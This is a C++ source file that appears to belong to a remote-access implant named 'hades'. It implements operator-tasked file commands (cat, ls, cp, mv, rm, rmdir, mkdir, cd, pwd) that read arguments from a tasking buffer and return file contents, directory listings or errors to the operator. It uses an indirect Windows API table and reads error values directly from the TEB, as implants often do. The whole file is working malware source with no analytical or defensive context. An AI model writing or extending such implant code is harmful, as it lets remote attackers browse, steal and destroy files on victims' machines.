#include "cmds.hpp"






void commanders::do_cat() {
	BOOL Result = FALSE;
	HANDLE hFile = NULL;
	PBYTE buf = NULL;
	DWORD ChunkSize = 2048;
	DWORD BytesRead = 0;


	g_ByteMgr->BeginTask();

	UINT FileLen = g_ByteMgr->Read4();
	PCHAR FileName = g_ByteMgr->ReadString(FileLen);

	hFile = hades->WinApis.CreateFileA(FileName, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (!hFile || hFile == INVALID_HANDLE_VALUE) {
		g_ByteMgr->EndErr(GetTeb()->LastErrorValue);
		goto CLEANUP;
	}
	buf = AllocMemory<BYTE>(ChunkSize);
	Result = hades->WinApis.ReadFile(hFile, (PBYTE)buf, ChunkSize, &BytesRead, NULL);
	if (Result) {
		g_ByteMgr->EndOkData(TASK_TYPE_NO_PARSE, BytesRead, buf);
		goto CLEANUP;
	}
	else {
		g_ByteMgr->EndErr(GetTeb()->LastErrorValue);
		goto CLEANUP;
	}

CLEANUP:
	if (FileName) { g_ByteMgr->FreeString(FileName); }
	if (buf) { HeapFree(GetProcessHeap(), 0, buf); }
	if (hFile) { hades->WinApis.CloseHandle(hFile); }
	return;



}




void commanders::do_ls() {
	WIN32_FIND_DATAA FindData;
	HANDLE hFind = NULL;

	DWORD typeLen;
	DWORD BufSize = 12 * 1024;
	DWORD TotalSize = 0;
	DWORD Namelen = 0;
	DWORD EntryLen = 0;
	DWORD PathSize = 0;

	char path[MAX_PATH];
	const char* type;
	g_ByteMgr->BeginTask();

	UINT len = g_ByteMgr->Read4();
	PCHAR Dir = g_ByteMgr->ReadString(len);



	PathSize = hades->WinApis.GetFullPathNameA(Dir, MAX_PATH, path, NULL);
	DWORD attrs = hades->WinApis.GetFileAttributesA(Dir);
	BOOL file = (attrs != INVALID_FILE_ATTRIBUTES) && !(attrs & FILE_ATTRIBUTE_DIRECTORY);
	if (!file) {
		path[PathSize] = '\\';
		path[++PathSize] = '*';
		path[++PathSize] = '\0';
	}


	hFind = hades->WinApis.FindFirstFileA(path, &FindData);
	if (!hFind || hFind == INVALID_HANDLE_VALUE) {
		g_ByteMgr->EndErr(GetTeb()->LastErrorValue);
		goto CLEANUP;
	}


	g_ByteMgr->Write4(STATUS_OK);
	g_ByteMgr->Write4(TASK_TYPE_LS);
	do {
		if (strcmp(FindData.cFileName, "..") == 0 || strcmp(FindData.cFileName, ".") == 0) {
			continue;
		}
		if (FindData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
			type = "DIR"; typeLen = 3;
		}
		else if (FindData.dwFileAttributes & FILE_ATTRIBUTE_REPARSE_POINT) {
			type = "LINK", typeLen = 4;
		}
		else {
			type = "FILE"; typeLen = 4;
		}

		UINT len = (UINT)strlen(FindData.cFileName);
		g_ByteMgr->Write4(len);
		g_ByteMgr->WriteString((PBYTE)FindData.cFileName, len);
		g_ByteMgr->Write4(typeLen);
		g_ByteMgr->WriteString((PBYTE)type, typeLen);
		ULONGLONG size = ((ULONGLONG)FindData.nFileSizeHigh << 32) | FindData.nFileSizeLow;
		g_ByteMgr->Write8(size);

	} while (hades->WinApis.FindNextFileA(hFind, &FindData));

	g_ByteMgr->Write4(END_SIG);

CLEANUP:
	if (Dir) { g_ByteMgr->FreeString(Dir); }

}

void commanders::do_cp() {
	g_ByteMgr->BeginTask();

	UINT srcLen = g_ByteMgr->Read4();
	PCHAR src = g_ByteMgr->ReadString(srcLen);
	UINT dstLen = g_ByteMgr->Read4();
	PCHAR dst = g_ByteMgr->ReadString(dstLen);

	BOOL Result = hades->WinApis.CopyFileA(src, dst, FALSE);
	if (!Result) {
		g_ByteMgr->EndErr(GetTeb()->LastErrorValue);
		goto CLEANUP;
	}
	g_ByteMgr->EndOk(CP_SUCCESS);
CLEANUP:
	if (src) { g_ByteMgr->FreeString(src); }
	if (dst) { g_ByteMgr->FreeString(dst); }
	return;

}


void commanders::do_rmdir() {
	g_ByteMgr->BeginTask();

	UINT DirLen = g_ByteMgr->Read4();
	PCHAR DirName = g_ByteMgr->ReadString(DirLen);

	if (!hades->WinApis.RemoveDirectoryA(DirName)) {
		g_ByteMgr->EndErr(GetTeb()->LastErrorValue);
		goto CLEANUP;
	}
	g_ByteMgr->EndOk(RMDIR_SUCCESS);

CLEANUP:
	if (DirName) { g_ByteMgr->FreeString(DirName); }
	return;
}


void commanders::do_mkdir() {
	g_ByteMgr->BeginTask();

	DWORD Len = g_ByteMgr->Read4();
	PCHAR Name = g_ByteMgr->ReadString(Len);

	if (!hades->WinApis.CreateDirectoryA(Name, NULL)) {
		g_ByteMgr->EndErr(GetTeb()->LastErrorValue);
		goto CLEANUP;
	}
	g_ByteMgr->EndOk(MKDIR_SUCCESS);

CLEANUP:
	if (Name) { g_ByteMgr->FreeString(Name); }
}

void commanders::do_rm() {
	g_ByteMgr->BeginTask();

	UINT NameLen = g_ByteMgr->Read4();
	PCHAR FileName = g_ByteMgr->ReadString(NameLen);

	if (!hades->WinApis.DeleteFileA(FileName)) {
		g_ByteMgr->EndErr(GetTeb()->LastErrorValue);
		goto CLEANUP;
	}
	g_ByteMgr->EndOk(RM_SUCCESS);

CLEANUP:
	if (FileName) { g_ByteMgr->FreeString(FileName); }
	return;
}

void commanders::do_cd() {
	g_ByteMgr->BeginTask();

	UINT DirLen = g_ByteMgr->Read4();
	PCHAR dir = g_ByteMgr->ReadString(DirLen);
	if (!hades->WinApis.SetCurrentDirectoryA(dir)) {
		g_ByteMgr->EndErr(GetTeb()->LastErrorValue);
		goto CLEANUP;
	}

	g_ByteMgr->EndOk(CD_SUCCESS);
CLEANUP:
	if (dir) { g_ByteMgr->FreeString(dir); }
	return;
}

void commanders::do_pwd() {
	DWORD Res = 0;
	UINT TaskID = g_ByteMgr->BeginTask();

	DWORD size = hades->WinApis.GetCurrentDirectoryA(0, NULL);

	PCHAR buf = AllocMemory<CHAR>(size);
	if (!buf) {
		g_ByteMgr->EndErr(ERROR_OUT_OF_MEMORY);
		goto CLEANUP;
	}

	Res = hades->WinApis.GetCurrentDirectoryA(size, buf);
	if (Res == 0 || Res >= size) {

		g_ByteMgr->EndErr(GetTeb()->LastErrorValue);
		goto CLEANUP;
	}


	g_ByteMgr->EndOkData(TASK_TYPE_NO_PARSE, Res, (PBYTE)buf);

CLEANUP:
	if (buf) { HeapFree(GetProcessHeap(), 0, buf); }
	return;
}

void commanders::do_mv() {
	UINT TaskID = g_ByteMgr->BeginTask();

	UINT srclen = g_ByteMgr->Read4();
	PCHAR src = g_ByteMgr->ReadString(srclen);
	UINT dstlen = g_ByteMgr->Read4();
	PCHAR dest = g_ByteMgr->ReadString(dstlen);

	if (!hades->WinApis.MoveFileA(src, dest)) {
		g_ByteMgr->EndErr(GetTeb()->LastErrorValue);
		goto CLEANUP;
	}
	g_ByteMgr->EndOk(MV_SUCCESS);

CLEANUP:
	if (src) { g_ByteMgr->FreeString(src); };
	if (dest) { g_ByteMgr->FreeString(dest); }
	return;

}